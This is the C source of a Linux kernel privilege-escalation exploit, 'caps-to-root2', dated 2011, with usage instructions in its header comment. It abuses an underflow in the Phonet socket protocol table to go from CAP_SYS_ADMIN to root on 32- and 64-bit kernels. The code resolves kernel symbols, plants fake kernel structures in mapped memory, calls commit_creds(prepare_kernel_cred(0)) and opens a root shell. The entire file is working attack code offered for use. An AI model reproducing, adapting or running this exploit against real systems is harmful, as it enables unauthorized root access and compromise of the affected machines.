/*
 * Linux Kernel CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit)
 * by Joe Sylve
 * @jtsylve on twitter
 *
 * Released: Jan 7, 2011
 *
 * Based on the bug found by Dan Rosenberg (@djrbliss)
 * only loosly based on his exploit http://www.exploit-db.com/exploits/15916/
 *
 * Usage:
 * gcc -w caps-to-root2.c -o caps-to-root2
 * sudo setcap cap_sys_admin+ep caps-to-root2
 * ./caps-to-root2
 *
 * Kernel Version >= 2.6.34 (untested on earlier versions)
 *
 * Tested on Ubuntu 10.10 64-bit and Ubuntu 10.10 32-bit
 *
 * This exploit takes advantage of the same underflow as the original,
 * but takes a different approach.  Instead of underflowing into userspace
 * (which doesn't work on 64-bit systems and is a lot of work), I underflow
 * to some static values inside of the kernel which are referenced as pointers
 * to userspace.  This method is pretty simple and seems to be reliable.
 */

#include <stdio.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// Skeleton Structures of the Kernel Structures we're going to spoof
struct proto_ops_skel {
	int	family;
	void  *buffer1[8];
	int	(*ioctl)(void *, int, long);
	void  *buffer2[12];
};

struct phonet_protocol_skel {
	void	*ops;
	void	*prot;
	int	sock_type;
};


#ifdef __x86_64__

#define SYM_NAME "local_port_range"
#define SYM_ADDRESS 0x0000007f00000040
#define SYM_OFFSET 0x0

typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);

#else //32-bit

#define SYM_NAME "pn_proto"
#define SYM_ADDRESS 0x4e4f4850
#define SYM_OFFSET 0x90

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

#endif


_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

int getroot(void * v, int i, long l)
{
	commit_creds(prepare_kernel_cred(0));
	return 0;
}

/* thanks spender... */
unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	int ret;

	char command[512];

	sprintf(command, "grep \"%s\" /proc/kallsyms", name);

	f = popen(command, "r");

	while(ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);

		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}

		if (!strcmp(name, sname)) {

			fprintf(stdout, " [+] Resolved %s to %p\n", name, (void *)addr);
			pclose(f);
			return addr;
		}
	}

	pclose(f);
	return 0;
}

int main(int argc, char * argv[])
{

	int sock, proto;
	unsigned long proto_tab, low_kern_sym, pn_proto;
	void * map;

	/* Create a socket to load the module for symbol support */
	printf("[*] Testing Phonet support and CAP_SYS_ADMIN...\n");
	sock = socket(PF_PHONET, SOCK_DGRAM, 0);

	if(sock < 0) {
		if(errno == EPERM)
			printf("[*] You don't have CAP_SYS_ADMIN.\n");

		else
			printf("[*] Failed to open Phonet socket.\n");

		return -1;
	}

	close(sock);

	/* Resolve kernel symbols */
	printf("[*] Resolving kernel symbols...\n");

	proto_tab = get_kernel_sym("proto_tab");
	low_kern_sym = get_kernel_sym(SYM_NAME) + SYM_OFFSET;
	pn_proto =  get_kernel_sym("pn_proto");
	commit_creds = (void *) get_kernel_sym("commit_creds");
	prepare_kernel_cred = (void *) get_kernel_sym("prepare_kernel_cred");

	if(!proto_tab || !commit_creds || !prepare_kernel_cred) {
		printf("[*] Failed to resolve kernel symbols.\n");
		return -1;
	}

	if (low_kern_sym >= proto_tab) {
		printf("[*] %s is mapped higher than prototab.  Can not underflow :-(.\n", SYM_NAME);
		return -1;
	}


	/* Map it */
	printf("[*] Preparing fake structures...\n");

	const struct proto_ops_skel fake_proto_ops2 = {
			.family		= AF_PHONET,
			.ioctl		= &getroot,
	};

	struct phonet_protocol_skel pps = {
			.ops = (void *) &fake_proto_ops2,
			.prot = (void *) pn_proto,
			.sock_type = SOCK_DGRAM,
	};

	printf("[*] Copying Structures.\n");

	map = mmap((void *) SYM_ADDRESS, 0x1000,
			PROT_READ | PROT_WRITE | PROT_EXEC,
			MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	if(map == MAP_FAILED) {
		printf("[*] Failed to map landing area.\n");
		perror("mmap");
		return -1;
	}


	memcpy((void *) SYM_ADDRESS, &pps, sizeof(pps));

	// Calculate Underflow
	proto = -((proto_tab - low_kern_sym) / sizeof(void *));

	printf("[*] Underflowing with offset %d\n", proto);

	sock = socket(PF_PHONET, SOCK_DGRAM, proto);

	if(sock < 0) {
		printf("[*] Underflow failed :-(.\n");
		return -1;
	}

	printf("[*] Elevating privlidges...\n");
	ioctl(sock, 0, NULL);


	if(getuid()) {
		printf("[*] Exploit failed to get root.\n");
		return -1;
	}

	printf("[*] This was a triumph... I'm making a note here, huge success.\n");
	execl("/bin/sh", "/bin/sh", NULL);

	close(sock);
	munmap(map, 0x1000);

	return 0;
}